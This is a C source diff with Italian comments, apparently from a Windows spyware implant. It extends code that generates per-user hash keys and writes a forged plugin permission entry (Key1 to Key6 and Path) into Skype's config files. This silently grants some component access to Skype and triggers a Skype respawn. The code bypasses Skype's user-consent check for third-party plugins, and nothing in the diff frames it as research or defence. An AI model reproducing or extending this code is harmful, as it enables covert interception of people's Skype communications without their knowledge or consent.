@@ -2011,13 +2011,13 @@ char *GetXMLNodeA(char *data, char *node, char *buffer)
 	return ret_val;	
 }
 
-// Verifica se l'ACL nel file corrisponde alla nostra
-BOOL CheckACL(char *key1, char *key2, char *key3, char *key4, char *path, char *m_key1, char *m_key2, char *m_key3, char *m_key4, char *m_path)
-{
-	if (/*!stricmp(key1, m_key1) &&*/ !stricmp(key2, m_key2) && !stricmp(key3, m_key3) && !stricmp(key4, m_key4)/* && !stricmp(path, m_path)*/)
-		return TRUE;
-	return FALSE;
-}
+//// Verifica se l'ACL nel file corrisponde alla nostra
+//BOOL CheckACL(char *key1, char *key2, char *key3, char *key4, char *path, char *m_key1, char *m_key2, char *m_key3, char *m_key4, char *m_path)
+//{
+//	if (/*!stricmp(key1, m_key1) &&*/ !stricmp(key2, m_key2) && !stricmp(key3, m_key3) && !stricmp(key4, m_key4)/* && !stricmp(path, m_path)*/)
+//		return TRUE;
+//	return FALSE;
+//}
 
 DWORD RapidGetFileSize(HANDLE hfile)
 {
@@ -2091,7 +2091,7 @@ BOOL IsACLPresent(WCHAR *config_path, char *m_key1, char *m_key2, char *m_key3, 
 }
 
 // Scriva la nostra ACL nel file di config
-BOOL WriteSkypeACL(WCHAR *config_path, char *key1, char *key2, char *key3, char *key4, char *path, BOOL isOld)
+BOOL WriteSkypeACL(WCHAR *config_path, char *key1, char *key2, char *key3, char *key4, char *key5, char *key6, char *path, BOOL isOld)
 {
 	HANDLE hFile;
 	HANDLE hMap;
@@ -2173,6 +2173,13 @@ BOOL WriteSkypeACL(WCHAR *config_path, char *key1, char *key2, char *key3, char 
 	WriteFile(hFile, "<Key4>", strlen("<Key4>"), &dummy, NULL);
 	WriteFile(hFile, key4, strlen(key4), &dummy, NULL);
 	WriteFile(hFile, "</Key4>\r\n", strlen("</Key4>\r\n"), &dummy, NULL);
+	WriteFile(hFile, "<Key5>", strlen("<Key5>"), &dummy, NULL);
+	WriteFile(hFile, key5, strlen(key5), &dummy, NULL);
+	WriteFile(hFile, "</Key5>\r\n", strlen("</Key5>\r\n"), &dummy, NULL);
+	WriteFile(hFile, "<Key6>", strlen("<Key6>"), &dummy, NULL);
+	WriteFile(hFile, key6, strlen(key6), &dummy, NULL);
+	WriteFile(hFile, "</Key6>\r\n", strlen("</Key6>\r\n"), &dummy, NULL);
+
 	WriteFile(hFile, "<Path>", strlen("<Path>"), &dummy, NULL);
 	WriteFile(hFile, path, strlen(path), &dummy, NULL);
 	if (!isOld)
@@ -2252,8 +2259,8 @@ BOOL IsOldSkypeVersion(WCHAR *config_path)
 }
 
 
-extern BOOL SkypeACLKeyGen(char *lpUserName, char *lpFileName, char *lpOutKey1, char *lpOutKey2, char *lpOutKey3, char *lpOutKey4, char *lpOutPath, BOOL isOld);
-BOOL CalculateUserHash(WCHAR *user_name, WCHAR *file_path, char *m_key1, char *m_key2, char *m_key3, char *m_key4, char *m_path, BOOL isOld)
+extern BOOL SkypeACLKeyGen(char *lpUserName, char *lpFileName, char *lpOutKey1, char *lpOutKey2, char *lpOutKey3, char *lpOutKey4, char *lpOutKey5, char *lpOutKey6, char *lpOutPath, BOOL isOld);
+BOOL CalculateUserHash(WCHAR *user_name, WCHAR *file_path, char *m_key1, char *m_key2, char *m_key3, char *m_key4, char *m_key5, char *m_key6, char *m_path, BOOL isOld)
 {
 	char c_user_name[MAX_PATH];
 	char c_file_path[MAX_PATH];
@@ -2265,13 +2272,15 @@ BOOL CalculateUserHash(WCHAR *user_name, WCHAR *file_path, char *m_key1, char *m
 	ZeroMemory(m_key2, MAX_HASHKEY_LEN);
 	ZeroMemory(m_key3, MAX_HASHKEY_LEN);
 	ZeroMemory(m_key4, MAX_HASHKEY_LEN);
+	ZeroMemory(m_key5, MAX_HASHKEY_LEN);
+	ZeroMemory(m_key6, MAX_HASHKEY_LEN);
 	ZeroMemory(m_path, MAX_HASHKEY_LEN);
 
-	return SkypeACLKeyGen(c_user_name, c_file_path, m_key1, m_key2, m_key3, m_key4, m_path, isOld);
+	return SkypeACLKeyGen(c_user_name, c_file_path, m_key1, m_key2, m_key3, m_key4, m_key5, m_key6, m_path, isOld);
 }
 
 // Cerca (e in caso fa calcolare) gli hash corretti relativi ad un particolare utente
-BOOL FindHashKeys(WCHAR *user_name, WCHAR *file_path, char *m_key1, char *m_key2, char *m_key3, char *m_key4, char *m_path, BOOL isOld)
+BOOL FindHashKeys(WCHAR *user_name, WCHAR *file_path, char *m_key1, char *m_key2, char *m_key3, char *m_key4, char *m_key5, char *m_key6, char *m_path, BOOL isOld)
 {
 	typedef struct {
 		WCHAR user_name[MAX_PATH];
@@ -2279,6 +2288,8 @@ BOOL FindHashKeys(WCHAR *user_name, WCHAR *file_path, char *m_key1, char *m_key2
 		char m_key2[MAX_HASHKEY_LEN];
 		char m_key3[MAX_HASHKEY_LEN];
 		char m_key4[MAX_HASHKEY_LEN];
+		char m_key5[MAX_HASHKEY_LEN];
+		char m_key6[MAX_HASHKEY_LEN];
 		char m_path[MAX_HASHKEY_LEN];
 	} user_hash_struct;
 
@@ -2297,6 +2308,8 @@ BOOL FindHashKeys(WCHAR *user_name, WCHAR *file_path, char *m_key1, char *m_key2
 				memcpy(m_key2, user_hash_array_old[i].m_key2, MAX_HASHKEY_LEN);
 				memcpy(m_key3, user_hash_array_old[i].m_key3, MAX_HASHKEY_LEN);
 				memcpy(m_key4, user_hash_array_old[i].m_key4, MAX_HASHKEY_LEN);
+				memcpy(m_key5, user_hash_array_old[i].m_key5, MAX_HASHKEY_LEN);
+				memcpy(m_key6, user_hash_array_old[i].m_key6, MAX_HASHKEY_LEN);
 				memcpy(m_path, user_hash_array_old[i].m_path, MAX_HASHKEY_LEN);
 				return TRUE;
 			}
@@ -2308,13 +2321,15 @@ BOOL FindHashKeys(WCHAR *user_name, WCHAR *file_path, char *m_key1, char *m_key2
 				memcpy(m_key2, user_hash_array_new[i].m_key2, MAX_HASHKEY_LEN);
 				memcpy(m_key3, user_hash_array_new[i].m_key3, MAX_HASHKEY_LEN);
 				memcpy(m_key4, user_hash_array_new[i].m_key4, MAX_HASHKEY_LEN);
+				memcpy(m_key5, user_hash_array_new[i].m_key5, MAX_HASHKEY_LEN);
+				memcpy(m_key6, user_hash_array_new[i].m_key6, MAX_HASHKEY_LEN);
 				memcpy(m_path, user_hash_array_new[i].m_path, MAX_HASHKEY_LEN);
 				return TRUE;
 			}
 		}
 	}
 
-	if (!CalculateUserHash(user_name, file_path, m_key1, m_key2, m_key3, m_key4, m_path, isOld))
+	if (!CalculateUserHash(user_name, file_path, m_key1, m_key2, m_key3, m_key4, m_key5, m_key6, m_path, isOld))
 		return FALSE;
 
 	if (isOld) {
@@ -2326,6 +2341,8 @@ BOOL FindHashKeys(WCHAR *user_name, WCHAR *file_path, char *m_key1, char *m_key2
 		memcpy(user_hash_array_old[user_hash_size_old].m_key2, m_key2, sizeof(user_hash_array_old[user_hash_size_old].m_key2));
 		memcpy(user_hash_array_old[user_hash_size_old].m_key3, m_key3, sizeof(user_hash_array_old[user_hash_size_old].m_key3));
 		memcpy(user_hash_array_old[user_hash_size_old].m_key4, m_key4, sizeof(user_hash_array_old[user_hash_size_old].m_key4));
+		memcpy(user_hash_array_old[user_hash_size_old].m_key5, m_key5, sizeof(user_hash_array_old[user_hash_size_old].m_key5));
+		memcpy(user_hash_array_old[user_hash_size_old].m_key6, m_key6, sizeof(user_hash_array_old[user_hash_size_old].m_key6));
 		memcpy(user_hash_array_old[user_hash_size_old].m_path, m_path, sizeof(user_hash_array_old[user_hash_size_old].m_path));
 		user_hash_size_old++;
 	} else {
@@ -2337,6 +2354,8 @@ BOOL FindHashKeys(WCHAR *user_name, WCHAR *file_path, char *m_key1, char *m_key2
 		memcpy(user_hash_array_new[user_hash_size_new].m_key2, m_key2, sizeof(user_hash_array_new[user_hash_size_new].m_key2));
 		memcpy(user_hash_array_new[user_hash_size_new].m_key3, m_key3, sizeof(user_hash_array_new[user_hash_size_new].m_key3));
 		memcpy(user_hash_array_new[user_hash_size_new].m_key4, m_key4, sizeof(user_hash_array_new[user_hash_size_new].m_key4));
+		memcpy(user_hash_array_new[user_hash_size_new].m_key5, m_key5, sizeof(user_hash_array_new[user_hash_size_new].m_key5));
+		memcpy(user_hash_array_new[user_hash_size_new].m_key6, m_key6, sizeof(user_hash_array_new[user_hash_size_new].m_key6));
 		memcpy(user_hash_array_new[user_hash_size_new].m_path, m_path, sizeof(user_hash_array_new[user_hash_size_new].m_path));
 		user_hash_size_new++;
 	}
@@ -2382,7 +2401,7 @@ void CheckSkypePluginPermissions(DWORD skype_pid, WCHAR *skype_path)
 	WIN32_FIND_DATAW find_data;
 	HANDLE hFind, hSkype, hFile;
 	BOOL is_to_respawn = FALSE;
-	char m_key1[MAX_HASHKEY_LEN], m_key2[MAX_HASHKEY_LEN], m_key3[MAX_HASHKEY_LEN], m_key4[MAX_HASHKEY_LEN], m_path[MAX_HASHKEY_LEN];
+	char m_key1[MAX_HASHKEY_LEN], m_key2[MAX_HASHKEY_LEN], m_key3[MAX_HASHKEY_LEN], m_key4[MAX_HASHKEY_LEN], m_key5[MAX_HASHKEY_LEN], m_key6[MAX_HASHKEY_LEN], m_path[MAX_HASHKEY_LEN];
 	BOOL isOld;
 	WCHAR skype_user_name[MAX_PATH];
 
@@ -2411,9 +2430,9 @@ void CheckSkypePluginPermissions(DWORD skype_pid, WCHAR *skype_path)
 			// Verifica se contiene gia' la permission altrimenti la scrive
 			isOld = IsOldSkypeVersion(config_path);			
 			SKypeNameConvert(find_data.cFileName, skype_user_name, sizeof(skype_user_name));
-			if (FindHashKeys(skype_user_name, core_path, m_key1, m_key2, m_key3, m_key4, m_path, isOld))
+			if (FindHashKeys(skype_user_name, core_path, m_key1, m_key2, m_key3, m_key4, m_key5, m_key6, m_path, isOld))
 				if (!IsACLPresent(config_path, m_key1, m_key2, m_key3, m_key4, m_path))
-					if (WriteSkypeACL(config_path, m_key1, m_key2, m_key3, m_key4, m_path, isOld)) 
+					if (WriteSkypeACL(config_path, m_key1, m_key2, m_key3, m_key4, m_key5, m_key6, m_path, isOld)) 
 						is_to_respawn = TRUE;
 		}
 	} while (FNC(FindNextFileW)(hFind, &find_data));
